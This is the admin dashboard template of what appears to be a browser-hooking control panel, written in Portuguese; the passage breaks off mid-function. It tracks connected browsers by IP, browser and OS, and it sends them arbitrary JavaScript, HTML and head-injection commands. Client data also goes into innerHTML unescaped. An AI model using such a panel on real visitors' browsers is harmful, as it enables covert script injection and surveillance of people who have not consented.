{% extends "admin_base.html" %}

{% from 'components/buttons.html' import refresh_button, primary_button, danger_button %}
{% from 'components/client_cards.html' import connection_badge %}
{% from 'components/notifications.html' import status_badge %}

{% block main_content %}
        <!-- Dashboard Section -->
        <div class="content-page active" id="dashboard-page">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <div class="dashboard-header">
                    <h1 class="mb-0">Dashboard</h1>
                    <span class="dashboard-status">
                        <i class="fas fa-circle-dot text-success me-1"></i> Sistema Online
                    </span>
                </div>
                <div class="dashboard-actions">
                    <div class="current-time me-3">
                        <i class="far fa-clock"></i>
                        <span id="current-time">00:00:00</span>
                    </div>
                    {{ refresh_button(onclick_func="refreshDashboard()") }}
                    <button class="btn btn-outline-success ms-2" 
                            hx-get="/admin/stats" 
                            hx-target="#stats-container" 
                            hx-trigger="click"
                            title="Forçar atualização das estatísticas">
                        <i class="fas fa-sync-alt"></i> <span class="d-none d-md-inline">Atualizar Stats</span>
                    </button>
                </div>
            </div>

            <!-- Stats Row with HTMX Auto-refresh -->
            <div class="stats-section">
                <!-- Loading indicator - stays outside of replaced content -->
                <div id="stats-loading" class="htmx-indicator text-center py-3">
                    <i class="fas fa-sync fa-spin text-primary"></i>
                    <span class="ms-2 text-muted">Atualizando estatísticas...</span>
                </div>
                
                <div class="row" 
                     id="stats-container"
                     hx-get="/admin/stats" 
                     hx-trigger="load, every 10s" 
                     hx-target="this"
                     hx-swap="innerHTML"
                     hx-indicator="#stats-loading">
                    <!-- Initial loading placeholder -->
                    <div class="col-12 text-center py-4">
                        <div class="spinner-border text-primary" role="status">
                            <span class="visually-hidden">Carregando estatísticas...</span>
                        </div>
                        <p class="mt-2 text-muted">Carregando estatísticas...</p>
                    </div>
                </div>
            </div>

            <!-- Charts Row -->
            <div class="row">
                <!-- Connection Types Chart -->
                <div class="col-xl-6 mb-4">
                    <div class="card">
                        <div class="card-header">
                            Tipos de Conexão
                        </div>
                        <div class="card-body chart-container">
                            <canvas id="connectionChart"></canvas>
                        </div>
                    </div>
                </div>
                
                <!-- Client Activity Chart -->
                <div class="col-xl-6 mb-4">
                    <div class="card">
                        <div class="card-header">
                            Atividade de Clientes (últimas 24h)
                        </div>
                        <div class="card-body chart-container">
                            <canvas id="activityChart"></canvas>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Clients Table -->
            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span>Clientes Conectados</span>
                    <a href="#clients" class="btn btn-outline-danger btn-sm" data-page="clients" onclick="refreshClientsTables(); return false;">
                        Ver todos <i class="fas fa-arrow-right ms-1"></i>
                    </a>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-hover table-sortable table-dark" id="dashboard-clients-table">
                            <thead>
                                <tr>
                                    <th>Status</th>
                                    <th>ID do Cliente</th>
                                    <th>Última Atividade</th>
                                    <th>IP</th>
                                    <th>Browser</th>
                                    <th>OS</th>
                                    <th>Conexão</th>
                                    <th>Ações</th>
                                </tr>
                            </thead>
                            <tbody>
                                <!-- Preenchido dinamicamente via JavaScript -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <!-- Clients Section (placeholder to fix missing element error) -->
        <div class="content-page" id="clients-page" style="display:none;">
            <!-- Conteúdo da página de clientes será adicionado aqui -->
        </div>

        <!-- Commands Section -->
        <div class="content-page" id="commands-page">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h2 class="mb-0" style="margin-top: 25px;"><i class="fas fa-terminal me-2"></i>Comandos</h2>
                <div id="client-selector" class="d-none">
                    <div class="alert alert-dark">
                        <i class="fas fa-user-circle me-2"></i>
                        Cliente selecionado: <strong id="selected-client-id">Nenhum</strong>
                        {{ danger_button("Limpar", onclick="clearClientSelection()", icon="fas fa-times", classes="btn btn-sm btn-outline-danger ms-3", id="clear-selection") }}
                    </div>
                </div>
            </div>

            {% include 'partials/form_command_table.html' %}
        </div>

        <!-- Logs Section -->
        <div class="content-page" id="logs-page">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h2 class="mb-0"><i class="fas fa-table-list me-2"></i>Logs</h2>
                {{ refresh_button(onclick_func="refreshLogs()") }}
            </div>
            
            {% include 'partials/logs_table.html' %}
        </div>
{% endblock %}

{% block scripts %}
    <script>

        document.addEventListener('DOMContentLoaded', function() {
            const sidebar = document.getElementById('sidebar');
            const header = document.getElementById('header');
            const mainContent = document.getElementById('main-content');
            const sidebarToggle = document.getElementById('sidebar-toggle');
            const sidebarTitle = document.getElementById('sidebar-title');
            
            // Função para alternar a barra lateral
            function toggleSidebar() {
                sidebar.classList.toggle('sidebar-collapsed');
                header.classList.toggle('header-collapsed');
                mainContent.classList.toggle('content-collapsed');
            }
            
            // Toggle sidebar ao clicar no botão
            sidebarToggle.addEventListener('click', toggleSidebar);
            
            // Toggle sidebar ao clicar no brand quando estiver colapsado
            const sidebarBrand = document.querySelector('.sidebar-brand');
            sidebarBrand.addEventListener('click', function(e) {
                // Só ativa quando o sidebar está colapsado e não é um clique no botão toggle
                if (sidebar.classList.contains('sidebar-collapsed') && 
                    !e.target.closest('.sidebar-toggle')) {
                    toggleSidebar();
                }
            });
            
            // Page navigation
            const menuItems = document.querySelectorAll('.menu-item');
            const contentPages = document.querySelectorAll('.content-page');
            
            menuItems.forEach(item => {
                item.addEventListener('click', function(e) {
                    const targetPage = this.getAttribute('data-page');
                    if (!targetPage) return;
                    
                    e.preventDefault();
                    
                    // Update active menu item
                    menuItems.forEach(i => i.classList.remove('active'));
                    this.classList.add('active');
                    
                    // Show target page
                    contentPages.forEach(page => {
                        page.classList.remove('active');
                    });
                    
                    // Safe access to target page element - prevent null reference error
                    const targetPageElement = document.getElementById(targetPage + '-page');
                    if (targetPageElement) {
                        targetPageElement.classList.add('active');
                        
                        // Special handling for specific pages
                        if (targetPage === 'clients') {
                            refreshClients();
                        } else if (targetPage === 'logs') {
                            refreshLogs();
                            // Inicializar o seletor de clientes para o console
                            if (typeof refreshClientsForConsole === 'function') {
                                refreshClientsForConsole();
                            }
                        } else if (targetPage === 'dashboard') {
                            refreshDashboard();
                        }
                    } else {
                        console.warn(`Page element with ID "${targetPage}-page" not found.`);
                    }
                    
                    // If mobile, close sidebar
                    if (window.innerWidth < 992) {
                        sidebar.classList.remove('sidebar-mobile-open');
                    }
                });
            });
            
            // Handle buttons that navigate to specific pages
            document.querySelectorAll('[data-page]').forEach(item => {
                if (item.classList.contains('menu-item')) return; // Skip menu items, already handled above
                
                item.addEventListener('click', function(e) {
                    const targetPage = this.getAttribute('data-page');
                    if (!targetPage) return;
                    
                    e.preventDefault();
                    
                    // Find and click corresponding menu item to handle navigation
                    const menuItem = document.querySelector(`.menu-item[data-page="${targetPage}"]`);
                    if (menuItem) {
                        menuItem.click();
                    } else {
                        console.warn(`Menu item for page "${targetPage}" not found.`);
                        
                        // Fallback: try to manually activate the page if menu item isn't found
                        const allPages = document.querySelectorAll('.content-page');
                        allPages.forEach(page => page.classList.remove('active'));
                        
                        const targetPageElement = document.getElementById(targetPage + '-page');
                        if (targetPageElement) {
                            targetPageElement.classList.add('active');
                        } else {
                            console.error(`Page "${targetPage}" not found.`);
                        }
                    }
                });
            });
            
            // Clear client selection
            document.getElementById('clear-selection').addEventListener('click', function() {
                clearClientSelection();
            });
            
            // Initialize
            refreshDashboard();
        });
        
        // WebSocket functionality removed - using HTTP polling only

        // Dashboard functions
        function refreshDashboard() {
            // Refresh client table - stats are now handled by HTMX auto-refresh
            fetchDashboardClients();
            
            // Update charts with current data
            fetchClientStats();
            
            // Notification counter functionality removed with WebSocket
        }
        
        function fetchClientStats() {
            // Fetch current client data and update charts
            fetch('/admin/clients')
                .then(response => response.json())
                .then(data => {
                    if (data.clients) {
                        const totalClients = data.clients.length;
                        const onlineClients = data.clients.filter(client => client.active).length;
                        const pollingClients = data.clients.filter(client => client.active).length;
                        
                        // Update connection type chart - WebSocket count removed
                        updateConnectionChart(0, pollingClients, totalClients - onlineClients);
                        
                        // Update activity chart with current data
                        updateClientActivityChart();
                    }
                })
                .catch(error => {
                    console.error('Error fetching client stats:', error);
                    // Show charts with sample data even if fetch fails
                    updateConnectionChart(0, 0, 0);
                    updateClientActivityChart();
                });
        }
        
        function fetchDashboardClients() {
            fetch('/admin/clients')
                .then(response => response.json())
                .then(data => {
                    const tableBody = document.querySelector('#dashboard-clients-table tbody');
                    
                    if (data.clients && data.clients.length > 0) {
                        // Sort clients: online first, then by last activity
                        data.clients.sort((a, b) => {
                            if (a.active !== b.active) return a.active ? -1 : 1;
                            return new Date(b.last_seen) - new Date(a.last_seen);
                        });
                        
                        // Display only top 5 clients
                        const displayClients = data.clients.slice(0, 5);
                        
                        const clientsHtml = displayClients.map(client => `
                            <tr class="${client.active ? '' : 'table-secondary'}" 
                                data-client-id="${client.id}" 
                                data-client-status="${client.active ? 'online' : 'offline'}"
                                data-client-connection="polling">
                                <td class="status-cell">
                                    <div class="status-tooltip" title="Última atividade: ${new Date(client.last_seen).toLocaleString()}">
                                        <span class="client-status ${client.active ? 'status-online' : 'status-offline'}"></span>
                                        ${client.active ? 'ON' : 'OFF'}
                                    </div>
                                </td>
                                <td>
                                    <div class="client-id">
                                        <code>${client.id}</code>
                                    </div>
                                </td>
                                <td>${new Date(client.last_seen).toLocaleString()}</td>
                                <td>${client.ip || 'N/A'}</td>
                                <td>
                                    <div class="browser-cell" title="${client.user_agent || 'N/A'}">
                                        <i class="fas fa-globe me-1"></i>${parseUserAgent(client.user_agent).browser}
                                    </div>
                                </td>
                                <td>
                                    <div class="os-cell" title="${client.user_agent || 'N/A'}">
                                        <i class="fas fa-desktop me-1"></i>${parseUserAgent(client.user_agent).os}
                                    </div>
                                </td>
                                <td>
                                    <span class="btn btn-sm badge-polling"><i class="fas fa-sync me-1"></i>Polling</span>
                                </td>
                                <td>
                                    <div class="d-flex gap-2">
                                        <button onclick="targetClient('${client.id}')" class="btn btn-sm btn-danger">
                                            <i class="fas fa-terminal"></i>
                                            <span class="tooltip-action">Selecionar Cliente</span>
                                        </button>
                                        <button onclick="removeClient('${client.id}')" class="btn btn-sm btn-danger delete">
                                            <i class="fas fa-trash-alt"></i>
                                            <span class="tooltip-action">Remover Cliente</span>
                                        </button>
                                    </div>
                                </td>
                            </tr>
                        `).join('');
                        
                        tableBody.innerHTML = clientsHtml;
                    } else {
                        tableBody.innerHTML = '<tr><td colspan="7" class="text-center">Nenhum cliente encontrado.</td></tr>';
                    }
                })
                .catch(error => {
                    console.error('Error loading dashboard clients:', error);
                    document.querySelector('#dashboard-clients-table tbody').innerHTML = 
                        '<tr><td colspan="7" class="text-center text-danger">Erro ao carregar clientes.</td></tr>';
                });
        }
        
        // Charts
        function updateConnectionChart(websocketCount, polling, offline) {
            // WebSocket support removed - all clients use polling now
            const ctx = document.getElementById('connectionChart');
            if (!ctx) {
                console.error("Chart canvas element 'connectionChart' not found");
                return;
            }
            
            try {
                // Destroy existing chart if it exists
                if (window.connectionChart && typeof window.connectionChart.destroy === 'function') {
                    window.connectionChart.destroy();
                }
                
                // Create new chart
                window.connectionChart = new Chart(ctx, {
                    type: 'doughnut',
                    data: {
                        labels: ['Polling', 'Offline'],
                        datasets: [{
                            data: [polling, offline],
                            backgroundColor: [
                                '#007bff',  // Primary (Polling)
                                '#6c757d'   // Secondary (Offline)
                            ],
                            borderWidth: 0
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: {
                            legend: {
                                position: 'right',
                                labels: {
                                    color: '#e0e0e0'
                                }
                            }
                        }
                    }
                });
            } catch (error) {
                console.error("Error creating connection chart:", error);
            }
        }
        
        function updateClientActivityChart(activityData = null) {
            const ctx = document.getElementById('activityChart');
            if (!ctx) {
                console.error("Chart canvas element 'activityChart' not found");
                return;
            }
             try {
                // Use real data if provided, otherwise generate sample data
                const hours = [...Array(24).keys()].map(i => `${i}h`);
                let activity;
                
                if (activityData && Array.isArray(activityData)) {
                    activity = activityData;
                } else {
                    // Fallback to sample data showing realistic activity pattern
                    activity = [...Array(24).keys()].map(i => {
                        // Simulate realistic activity: higher during day hours (8-20), lower at night
                        if (i >= 8 && i <= 20) {
                            return Math.floor(Math.random() * 5) + 2; // 2-6 active clients
                        } else {
                            return Math.floor(Math.random() * 3); // 0-2 active clients
                        }
                    });
                }
                
                // Destroy existing chart if it exists
                if (window.activityChart && typeof window.activityChart.destroy === 'function') {
                    window.activityChart.destroy();
                }
                
                window.activityChart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: hours,
                    datasets: [{
                        label: 'Clientes Ativos',
                        data: activity,
                        borderColor: '#00d68f',
                        backgroundColor: 'rgba(0, 214, 143, 0.1)',
                        tension: 0.4,
                        fill: true
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            ticks: {
                                color: '#8a8a8a'
                            },
                            grid: {
                                color: '#2c2c2c'
                            }
                        },
                        x: {
                            ticks: {
                                color: '#8a8a8a'
                            },
                            grid: {
                                color: '#2c2c2c'
                            }
                        }
                    },
                    plugins: {
                        legend: {
                            labels: {
                                color: '#e0e0e0'
                            }
                        }
                    }
                }
            });
            } catch (error) {
                console.error("Error creating activity chart:", error);
            }
        }

        // Command functions
        function sendCommand(type) {
            const statusElement = document.getElementById('status');
            const clientId = document.getElementById('target-client').value;
            
            try {
                let data = { 
                    type,
                    client_id: clientId
                };
                
                switch(type) {
                    case 'js':
                        data.content = document.getElementById('js-command').value;
                        if (!data.content.trim()) {
                            throw new Error("O código JavaScript não pode estar vazio");
                        }
                        break;
                    
                    case 'visibility':
                        data.target_id = document.getElementById('visibility-element').value;
                        data.visibility = document.querySelector('input[name="visibility"]:checked').value;
                        if (!data.target_id.trim()) {
                            throw new Error("O ID do elemento não pode estar vazio");
                        }
                        break;
                        
                    case 'html':
                        data.content = document.getElementById('html-content').value;
                        if (!data.content.trim()) {
                            throw new Error("O conteúdo HTML não pode estar vazio");
                        }
                        break;
                        
                    case 'manipulate':
                        data.target_id = document.getElementById('target-element').value;
                        data.action = document.getElementById('action-type').value;
                        data.content = document.getElementById('manipulation-content').value;
                        if (!data.target_id.trim()) {
                            throw new Error("ID do elemento é obrigatório");
                        }
                        if (!data.content.trim()) {
                            throw new Error("O conteúdo a ser manipulado não pode estar vazio");
                        }
                        break;
                        
                    case 'visibility':
                        data.target_id = document.getElementById('visibility-element').value;
                        const radioChecked = document.querySelector('input[name="visibility"]:checked');
                        if (!radioChecked) {
                            throw new Error("Selecione uma opção de visibilidade");
                        }
                        data.content = radioChecked.value;
                        if (!data.target_id.trim()) {
                            throw new Error("ID do elemento é obrigatório");
                        }
                        break;

                    case 'head':
                        data.action = document.getElementById('head-action').value;
                        data.content = document.getElementById('head-content').value;
                        if (!data.content.trim()) {
                            throw new Error("O conteúdo para o head não pode estar vazio");
                        }
                        break;
                }
                
                statusElement.textContent = `Enviando comando ${type}...`;
                statusElement.className = '';
                
                fetch('/admin/set_command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    if (data.success) {
                        statusElement.textContent = `Comando enviado com sucesso às ${new Date().toLocaleTimeString()}`;
                        statusElement.className = 'connected';
                        
                        // Update logs if we're on logs page
                        if (document.getElementById('logs-page').classList.contains('active')) {
                            refreshLogs();
                        }
                        
                        // Note: Command count is now auto-updated via HTMX every 10 seconds
                        // Manual update removed to avoid conflicts with auto-refresh
                    } else {
                        throw new Error(data.error || "Erro no servidor ao processar comando");
                    }
                })
                .catch(error => {
                    statusElement.textContent = `Erro ao enviar comando: ${error.message}`;
                    statusElement.className = 'error';
                });
            } catch (error) {
                statusElement.textContent = `Erro: ${error.message}`;
                statusElement.className = 'error';
            }
        }
        

        // Client functions
        function refreshClients() {
            fetch('/admin/clients')
                .then(response => response.json())
                .then(data => {
                    // Usar dashboard-clients-table caso clients-table não exista
                    const clientsTable = document.getElementById('clients-table') || document.getElementById('dashboard-clients-table');
                    
                    if (!clientsTable) {
                        console.warn("Tabela de clientes não encontrada (nem clients-table nem dashboard-clients-table)");
                        return;
                    }
                    
                    const tableBody = clientsTable.querySelector('tbody');
                    if (!tableBody) {
                        console.warn("Corpo da tabela não encontrado");
                        return;
                    }
                    
                    // Counts for stats display
                    // WebSocket count removed - all clients use polling
                    let pollingCount = 0;
                    let clientRowsHtml = [];
                    
                    if (data.clients && data.clients.length > 0) {
                        // Sort clients: online first, then by last activity
                        data.clients.sort((a, b) => {
                            if (a.active !== b.active) return a.active ? -1 : 1;
                            return new Date(b.last_seen) - new Date(a.last_seen);
                        });
                        
                        // Generate HTML for all client rows
                        data.clients.forEach(client => {
                            // Update counts - WebSocket support removed
                            if (client.active) {
                                pollingCount++;
                            }
                            
                            const rowHtml = `
                                <tr class="${client.active ? '' : 'table-secondary'}" 
                                    data-client-id="${client.id}" 
                                    data-client-status="${client.active ? 'online' : 'offline'}"
                                    data-client-connection="polling"
                                    data-last-seen="${client.last_seen}">
                                    <td>
                                        <div class="status-tooltip" title="Última atividade: ${new Date(client.last_seen).toLocaleString()}">
                                            <span class="client-status ${client.active ? 'status-online' : 'status-offline'}"></span>
                                            ${client.active ? 'ON' : 'OFF'}
                                        </div>
                                    </td>
                                    <td>
                                        <div class="client-id">
                                            <code>${client.id}</code>
                                        </div>
                                    </td>
                                    <td>${new Date(client.last_seen).toLocaleString()}</td>
                                    <td>${client.ip || 'N/A'}</td>
                                    <td>
                                        <div class="browser-cell" title="${client.user_agent || 'N/A'}">
                                            <i class="fas fa-globe me-1"></i>${parseUserAgent(client.user_agent).browser}
                                        </div>
                                    </td>
                                    <td>
                                        <div class="os-cell" title="${client.user_agent || 'N/A'}">
                                            <i class="fas fa-desktop me-1"></i>${parseUserAgent(client.user_agent).os}
                                        </div>
                                    </td>
                                    <td>
                                        <span class="badge badge-polling"><i class="fas fa-sync me-1"></i>Polling</span>
                                    </td>
                                    <td>
                                        <div class="d-flex gap-2">
                                            <button onclick="targetClient('${client.id}')" class="btn btn-sm btn-danger">
                                                <i class="fas fa-terminal"></i>
                                                <span class="tooltip-action">Selecionar Cliente</span>
                                            </button>
                                            <button onclick="removeClient('${client.id}')" class="btn btn-sm btn-danger delete">
                                                <i class="fas fa-trash-alt"></i>
                                                <span class="tooltip-action">Remover Cliente</span>
                                            </button>
                                        </div>
                                    </td>
                                </tr>
                            `;
                            
                            clientRowsHtml.push(rowHtml);
                        });
                        
                        // Verificar se temos sistema de paginação
                        if (window.TablePagination) {
                            try {
                                // Encontrar instância de paginação para esta tabela ou criar uma nova
                                const paginationInstance = Object.values(window).find(
                                    obj => obj instanceof TablePagination && obj.tableId === clientsTable.id
                                );
                                
                                if (paginationInstance) {
                                    // Apenas atualize os dados da tabela via sistema de paginação
                                    paginationInstance.updateData(clientRowsHtml);
                                } else {
                                    // Fallback para o método padrão
                                    tableBody.innerHTML = clientRowsHtml.join('');
                                    // Inicialize a paginação
                                    new TablePagination(clientsTable.id, { rowsPerPage: 10 });
                                }
                            } catch (err) {
                                console.error("Erro ao aplicar paginação:", err);
                                tableBody.innerHTML = clientRowsHtml.join('');
                            }
                        } else {
                            // Se não tiver paginação, apenas atualize a tabela normalmente
                            tableBody.innerHTML = clientRowsHtml.join('');
                        }
                        
                        // Update stats display - WebSocket counter removed
                        const pollingCountEl = document.getElementById('polling-count');
                        
                        if (pollingCountEl) pollingCountEl.textContent = pollingCount;
                        
                        // Adiciona efeito de atualização aos contadores
                        ['polling-count'].forEach(id => {
                            const counter = document.getElementById(id);
                            if (!counter) return;
                            
                            counter.style.color = 'var(--accent-color)';
                            counter.style.textShadow = '0 0 5px var(--accent-color)';
                            
                            setTimeout(() => {
                                counter.style.color = '';
                                counter.style.textShadow = '';
                                counter.style.transition = 'all 0.5s ease';
                            }, 1000);
                        });
                        
                        // Update client dropdown
                        updateClientDropdown(data.clients);
                    } else {
                        tableBody.innerHTML = '<tr><td colspan="8" class="text-center">Nenhum cliente encontrado.</td></tr>';
                        
                        const pollingCountEl = document.getElementById('polling-count');
                        
                        if (pollingCountEl) pollingCountEl.textContent = '0';
                    }
                })
                .catch(error => {
                    console.error('Error loading clients:', error);
                    
                    // Procurar a tabela que existe
                    const clientsTable = document.getElementById('clients-table') || document.getElementById('dashboard-clients-table');
                    if (clientsTable) {
                        const tableBody = clientsTable.querySelector('tbody');
                        if (tableBody) {
                            tableBody.innerHTML = '<tr><td colspan="8" class="text-center text-danger">Erro ao carregar clientes: ' + error.message + '</td></tr>';
                        }
                    }
                });
        }
        
        function updateClientDropdown(clients) {
            const dropdown = document.getElementById('target-client');
            
            if (!dropdown) {
                console.warn("Elemento dropdown target-client não encontrado");
                return;
            }
            
            // Keep default option
            if (dropdown.options && dropdown.options.length > 0) {
                const defaultOption = dropdown.options[0];
                dropdown.innerHTML = '';
                dropdown.appendChild(defaultOption);
            } else {
                dropdown.innerHTML = '<option value="default">Todos os clientes</option>';
            }
            
            // Add clients
            if (clients && clients.length > 0) {
                clients.forEach(client => {
                    const option = document.createElement('option');
                    option.value = client.id;
                    
                    const status = client.active ? 'online' : 'offline';
                    option.textContent = `Cliente: ${client.id.substring(0, 8)}... (${status})`;
                    
                    if (!client.active) {
                        option.disabled = true;
                    }
                    
                    dropdown.appendChild(option);
                });
                
                // Adicionar event listener para o dropdown, se ainda não tiver sido adicionado
                if (!dropdown.hasAttribute('data-has-listener')) {
                    dropdown.addEventListener('change', updateSelectedClientInfo);
                    dropdown.setAttribute('data-has-listener', 'true');
                }
                
                // Atualiza as informações do cliente inicialmente
                if (typeof updateSelectedClientInfo === 'function') {
                    updateSelectedClientInfo();
                }
            }
        }
        
        // Função para atualizar as informações do cliente selecionado
        function updateSelectedClientInfo() {
            const dropdown = document.getElementById('target-client');
            const clientInfoSection = document.getElementById('client-info-section');
            
            // Verificar se os elementos necessários existem
            if (!dropdown || !clientInfoSection) {
                console.warn("Elementos necessários não encontrados para updateSelectedClientInfo");
                return;
            }
            
            // Se o valor for default, esconde a seção de informações
            if (dropdown.value === 'default') {
                clientInfoSection.classList.add('d-none');
                return;
            }
            
            // Busca os detalhes do cliente pelo ID
            fetch(`/admin/client/${dropdown.value}`)
                .then(response => response.json())
                .then(client => {
                    if (client && Object.keys(client).length > 0) {
                        // Função auxiliar para atualizar texto com verificação de nulo
                        const safeUpdateText = (elementId, text) => {
                            const element = document.getElementById(elementId);
                            if (element) element.textContent = text;
                        };
                        
                        // Função auxiliar para atualizar classe com verificação de nulo
                        const safeUpdateClass = (elementId, className) => {
                            const element = document.getElementById(elementId);
                            if (element) element.className = className;
                        };
                        
                        // Preenche as informações do cliente com verificações
                        safeUpdateText('info-client-id', client.id);
                        safeUpdateText('info-client-id-title', `Cliente ${client.id.substring(0, 8)}`);
                        
                        // Atualiza o indicador de status
                        const clientIndicator = document.getElementById('client-indicator');
                        if (clientIndicator) {
                            clientIndicator.className = 'client-indicator';
                            clientIndicator.classList.add(client.active ? 'online' : 'offline');
                        }
                        
                        // Atualiza o badge de status
                        const statusBadge = document.getElementById('client-status-badge');
                        if (statusBadge) {
                            if (client.active) {
                                statusBadge.innerHTML = '<span class="badge bg-success">Online</span>';
                            } else {
                                statusBadge.innerHTML = '<span class="badge bg-danger">Offline</span>';
                            }
                        }
                        
                        // Preenche as tags de tecnologia
                        const techTags = document.getElementById('client-tech-tags');
                        if (techTags) {
                            const userAgent = client.user_agent || 'N/A';
                            const parsedUA = parseUserAgent(userAgent);
                            
                            // Limpa as tags existentes
                            techTags.innerHTML = '';
                            
                            // Connection type tags - WebSocket support removed, all clients use polling
                            techTags.innerHTML += `<span class="tech-badge"><i class="fas fa-sync"></i> Polling</span>`;
                            
                            // Adiciona o navegador
                            if (parsedUA.browser) {
                                techTags.innerHTML += `<span class="tech-badge"><i class="fas fa-globe"></i> ${parsedUA.browser}</span>`;
                            }
                            
                            // Adiciona o sistema operacional
                            if (parsedUA.os) {
                                techTags.innerHTML += `<span class="tech-badge"><i class="fas fa-desktop"></i> ${parsedUA.os}</span>`;
                            }
                        }
                        
                        safeUpdateText('info-client-ip', client.ip || 'N/A');
                        safeUpdateText('info-client-last-activity', 
                            client.last_activity ? new Date(client.last_activity).toLocaleString() : 'N/A');
                        safeUpdateText('info-client-connection', 'Polling');
                        
                        // Detalhes de plataforma (navegador e sistema operacional)
                        const userAgent = client.user_agent || 'N/A';
                        const parsedUA = parseUserAgent(userAgent);
                        safeUpdateText('info-client-browser', parsedUA.browser);
                        safeUpdateText('info-client-os', parsedUA.os);
                        safeUpdateText('info-client-agent', userAgent);
                        
                        // Oculta os detalhes do User-Agent inicialmente
                        const userAgentDetails = document.getElementById('user-agent-details');
                        const showUserAgentBtn = document.getElementById('show-user-agent');
                        
                        if (userAgentDetails) userAgentDetails.classList.add('d-none');
                        if (showUserAgentBtn) showUserAgentBtn.innerHTML = '<i class="fas fa-info-circle"></i> Ver User-Agent completo';
                        
                        // Exibe a seção de informações
                        clientInfoSection.classList.remove('d-none');
                    } else {
                        clientInfoSection.classList.add('d-none');
                    }
                })
                .catch(error => {
                    console.error('Erro ao buscar informações do cliente:', error);
                    clientInfoSection.classList.add('d-none');
                });
        }
        
        // Função para selecionar um cliente-alvo para comandos
        function targetClient(clientId) {
            console.log('Selecionando cliente:', clientId);
            
            // Assegurar que o dropdown está atualizado antes de selecionar o cliente
            fetch('/admin/clients')
                .then(response => response.json())
                .then(data => {
                    // Atualiza o dropdown com os clientes mais recentes
                    updateClientDropdown(data.clients);
                    
                    // Seleciona o cliente no dropdown
                    const dropdown = document.getElementById('target-client');
                    if (dropdown) {
                        dropdown.value = clientId;
                        
                        // Se o valor não foi definido corretamente, significa que o cliente não está na lista
                        if (dropdown.value !== clientId) {
                            // Adiciona o cliente manualmente ao dropdown
                            const client = data.clients.find(c => c.id === clientId);
                            if (client) {
                                const option = document.createElement('option');
                                option.value = client.id;
                                const status = client.active ? 'online' : 'offline';
                                option.textContent = `Cliente: ${client.id.substring(0, 8)}... (${status})`;
                                dropdown.appendChild(option);
                                dropdown.value = clientId;
                            }
                        }
                        
                        // Atualiza a interface
                        const selectedClientIdElement = document.getElementById('selected-client-id');
                        if (selectedClientIdElement) {
                            selectedClientIdElement.textContent = clientId.substring(0, 8) + '...';
                            selectedClientIdElement.title = clientId; // Adiciona tooltip com ID completo
                        }
                        
                        const clientSelectorElement = document.getElementById('client-selector');
                        if (clientSelectorElement) {
                            clientSelectorElement.classList.remove('d-none');
                        }
                        
                        // Atualiza as informações do cliente selecionado
                        updateSelectedClientInfo();
                    }
                    
                    // Remove seleção de todas as linhas de todas as tabelas
                    document.querySelectorAll('tr.client-selected, tr.selected').forEach(r => {
                        r.classList.remove('client-selected', 'selected');
                        // Limpa quaisquer estilos inline para evitar problemas de layout
                        r.style.boxShadow = '';
                        r.style.borderLeft = '';
                    });
                    
                    // Destacar este cliente em todas as tabelas (USAR APENAS CLASSES, NÃO ESTILOS INLINE)
                    document.querySelectorAll(`tr[data-client-id="${clientId}"]`).forEach(row => {
                        // Reset das classes para garantir consistência
                        row.className = row.className.replace(/\bselected\b|\bclient-selected\b/g, '').trim();
                        
                        // Readiciona as classes limpas - mantendo as classes originais da tabela
                        const baseClasses = row.classList.contains('table-primary') ? 'table-primary' : 
                                            row.classList.contains('table-secondary') ? 'table-secondary' : '';
                                            
                        // Adiciona client-selected a todas as instâncias
                        row.className = `${baseClasses} client-selected`.trim();
                    });
                    
                    // Adiciona a classe 'selected' apenas à primeira instância encontrada
                    const firstInstance = document.querySelector(`tr[data-client-id="${clientId}"]`);
                    if (firstInstance) {
                        // Garante que a classe está sendo adicionada corretamente sem espaçamento extra
                        firstInstance.classList.add('selected');
                    }
                    
                    // Navigate to commands page if not already there
                    const currentPage = document.querySelector('.content-page.active');
                    if (currentPage && currentPage.id !== 'commands-page') {
                        const commandsMenuItem = document.querySelector('.menu-item[data-page="commands"]');
                        if (commandsMenuItem) {
                            commandsMenuItem.click();
                        }
                    }
                    
                    // Feedback visual para o usuário
                    showNeonToast(`Cliente ${clientId.substring(0, 8)}... selecionado`, 'success', 2000);
                })
                .catch(error => {
                    console.error('Erro ao buscar cliente:', error);
                    showNeonToast('Erro ao selecionar cliente', 'error');
                });
        }
        
        function clearClientSelection() {
            document.getElementById('target-client').value = 'default';
            document.getElementById('client-selector').classList.add('d-none');
        }
        
        function removeClient(clientId) {
            if (confirm(`Tem certeza que deseja remover o cliente ${clientId}?`)) {
                fetch(`/admin/clients/${clientId}`, {
                    method: 'DELETE'
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        // If the client was selected, clear the selection
                        if (document.getElementById('target-client').value === clientId) {
                            clearClientSelection();
                        }
                        
                        // Refresh clients list
                        refreshClients();
                        
                        // Update dashboard if we're on it
                        if (document.getElementById('dashboard-page').classList.contains('active')) {
                            refreshDashboard();
                        }
                    } else {
                        alert(`Erro ao remover cliente: ${data.error}`);
                    }
                })
                .catch(error => {
                    alert(`Erro ao remover cliente: ${error.message}`);
                });
            }
        }

        /**
         * Atualiza todas as tabelas de clientes no dashboard e na página de clientes
         */
        function refreshClientsTables() {
            try {
                // Verifica se a função showNeonToast existe e só então chama
                if (typeof showNeonToast === 'function') {
                    showNeonToast("Atualizando dados dos clientes...", "info", 1000);
                }
                refreshClients();
                // Verifica se a página de clientes existe antes de atualizar
                if (document.querySelector('.clients-page, #clients-page')) {
                    // Atualiza a lista principal de clientes na página de clientes
                    refreshClients();
                } else {
                    // Ainda tenta atualizar mesmo se o elemento não existir explicitamente
                    refreshClients();
                }
                
                // Atualiza o dashboard de clientes, se a função existir
